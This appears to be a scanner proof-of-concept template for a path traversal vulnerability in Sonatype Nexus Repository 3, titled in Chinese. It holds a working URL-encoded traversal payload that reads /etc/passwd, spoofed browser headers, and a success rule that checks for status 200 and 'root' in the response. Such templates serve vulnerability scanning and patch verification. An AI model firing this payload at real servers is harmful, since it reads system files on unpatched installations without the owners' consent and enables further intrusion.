{
        'name': 'Sonatype Nexus Repository 3 路径遍历漏洞',
        'poc':[{'requests':{
            'method': 'get',
            'payload': '/%2F%2F%2F%2F%2F%2F%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd',
            'headers': {
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept': '*/*',
                'Accept-Language': 'en-US;q=0.9,en;q=0.8',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36',
                'Connection': 'close'
            },
            'dnslog': False,
            'sqltime': False,
        },
        'response': {
            'status_code': 200,
            'text': 'root'
        }}]
    }